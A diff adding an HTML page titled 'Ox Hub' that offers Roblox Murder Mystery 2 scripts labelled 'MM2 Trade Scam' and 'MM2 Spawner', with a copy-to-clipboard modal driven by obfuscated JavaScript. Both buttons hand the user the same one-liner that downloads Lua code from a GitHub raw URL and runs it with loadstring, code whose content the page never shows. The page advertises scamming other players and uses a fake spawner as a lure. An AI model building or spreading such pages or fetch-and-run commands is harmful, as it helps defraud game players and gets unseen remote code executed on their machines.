@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ox Hub</title>
+    <style>
+        /* Reset margin and padding */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body style */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e1e;
+            color: #ffffff;
+            text-align: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Glow border effect */
+        .glow-border {
+            border: 2px solid #00aaff;
+            box-shadow: 0 0 15px #00aaff, 0 0 25px #00aaff;
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        /* Header style */
+        header {
+            margin-bottom: 20px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        h1 {
+            font-size: 2em;
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px #00aaff, 0 0 20px #00aaff;
+        }
+
+        p {
+            font-size: 1em;
+            color: #a0a0a0;
+        }
+
+        /* Search bar style */
+        .search-container {
+            margin: 20px auto;
+            width: 80%;
+            animation: fadeIn 1.2s ease-in-out;
+        }
+
+        .search-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 1em;
+            border-radius: 5px;
+            border: 1px solid #555;
+            background-color: #333;
+            color: #ffffff;
+        }
+
+        /* Card style */
+        .card {
+            background-color: #333;
+            border-radius: 10px;
+            padding: 15px;
+            width: 80%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .card h2 {
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        /* Card image placeholder */
+        .card-image {
+            background-color: #444;
+            height: 150px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-image img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        /* See script button style */
+        .see-script {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .see-script:hover {
+            background-color: #0056b3;
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .modal-content {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 500px;
+            text-align: left;
+            box-shadow: 0 0 15px #00aaff, 0 0 25px #00aaff;
+        }
+
+        .modal-content h3 {
+            color: #ffffff;
+            margin-bottom: 10px;
+            text-align: center;
+            text-shadow: 0 0 5px #00aaff, 0 0 10px #00aaff;
+        }
+
+        .modal-content .script-text {
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            color: #00aaff;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            user-select: all;
+            margin-bottom: 10px;
+        }
+
+        .copy-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .copy-button:hover {
+            background-color: #0056b3;
+        }
+
+        .close-button {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #ff4d4d;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .close-button:hover {
+            background-color: #cc0000;
+        }
+
+        /* Notification popup styles */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 class="glow-border">Ox Hub</h1>
+        <p>Scroll Down to Find Some Scripts!</p>
+    </header>
+
+    <div class="search-container">
+        <input type="text" id="searchInput" placeholder="Search for scripts..." oninput="filterScripts()">
+    </div>
+
+    <div class="card glow-border" data-title="MM2 Trade Scam">
+        <h2>MM2 Trade Scam By: Ox</h2>
+        <div class="card-image">
+            <img src="https://cdn.discordapp.com/attachments/1270444913716105329/1304580259676557463/maxresdefault.jpg?ex=672fe88b&is=672e970b&hm=d0179ac3b333afea63f0f3c61f38ccf2273f55dd7fc2a1aafd39159693589219&" alt="Script Image">
+        </div>
+        <button class="see-script" onclick="openModal('script1')">See Script</button>
+    </div>
+
+    <div class="card glow-border" data-title="Another Script">
+        <h2>MM2 Spawner By: Ox</h2>
+        <div class="card-image">
+            <img src="https://cdn.discordapp.com/attachments/1270444913716105329/1304580266878046268/mqdefault.jpg?ex=672fe88d&is=672e970d&hm=0961d713461691a260bc11432d0b27fe70be4fbac3819c04a5eacd2cde3b2187&" alt="Script Image">
+        </div>
+        <button class="see-script" onclick="openModal('script2')">See Script</button>
+    </div>
+
+    <!-- Modal for script display -->
+    <div class="modal" id="scriptModal">
+        <div class="modal-content">
+            <h3>Script Result</h3>
+            <div class="script-text" id="scriptText"></div>
+            <button class="copy-button" onclick="copyScript()">Copy Script</button>
+            <div class="close-button" onclick="closeModal()">Close</div>
+        </div>
+    </div>
+
+    <!-- Notification popup -->
+    <div id="notification" class="notification">Script copied to clipboard!</div>
+
+    <script>
+        const scripts={"\u0073\u0063\u0072\u0069\u0070\u0074\u0031":'loadstring(game:HttpGet(\x27https://raw.githubusercontent.com/kierpogixd1/mm2-roblox/main/script.lua\x27,\x20true))()',"\u0073\u0063\u0072\u0069\u0070\u0074\u0032":'loadstring(game:HttpGet(\x27https://raw.githubusercontent.com/kierpogixd1/mm2-roblox/main/script.lua\x27,\x20true))()'};function openModal(_0x537f0c){document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("txeTtpircs".split("").reverse().join(""))["\u0074\u0065\u0078\u0074\u0043\u006f\u006e\u0074\u0065\u006e\u0074"]=scripts[_0x537f0c];document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("ladoMtpircs".split("").reverse().join(""))["\u0073\u0074\u0079\u006c\u0065"]['display']='flex';}function closeModal(){document['getElementById']("ladoMtpircs".split("").reverse().join(""))['style']["\u0064\u0069\u0073\u0070\u006c\u0061\u0079"]="enon".split("").reverse().join("");}function copyScript(){const _0x450e39=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("\u0073\u0063\u0072\u0069\u0070\u0074\u0054\u0065\u0078\u0074")["\u0074\u0065\u0078\u0074\u0043\u006f\u006e\u0074\u0065\u006e\u0074"];navigator["\u0063\u006c\u0069\u0070\u0062\u006f\u0061\u0072\u0064"]["\u0077\u0072\u0069\u0074\u0065\u0054\u0065\u0078\u0074"](_0x450e39)["\u0074\u0068\u0065\u006e"](()=>{showNotification();});}function showNotification(){const _0x2f2819=document['getElementById']("noitacifiton".split("").reverse().join(""));_0x2f2819["\u0063\u006c\u0061\u0073\u0073\u004c\u0069\u0073\u0074"]['add']("wohs".split("").reverse().join(""));setTimeout(()=>{_0x2f2819["\u0063\u006c\u0061\u0073\u0073\u004c\u0069\u0073\u0074"]['remove']('show');},0x7efe2^0x7e45a);}function filterScripts(){const _0x1d74ff=document['getElementById']("tupnIhcraes".split("").reverse().join(""))['value']['toLowerCase']();const _0x1984db=document["\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072\u0041\u006c\u006c"]("drac.".split("").reverse().join(""));_0x1984db['forEach'](_0x52595a=>{const _0xf31419=_0x52595a["\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("eltit-atad".split("").reverse().join(""))["\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065"]();if(_0xf31419["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](_0x1d74ff)){_0x52595a['style']['display']='block';}else{_0x52595a['style']['display']="enon".split("").reverse().join("");}});}window['onclick']=function(_0x2f1061){const _0x60ba26=document['getElementById']('scriptModal');if(_0x2f1061['target']==_0x60ba26){_0x60ba26['style']['display']='none';}};
+    </script>
+</body>
+</html>
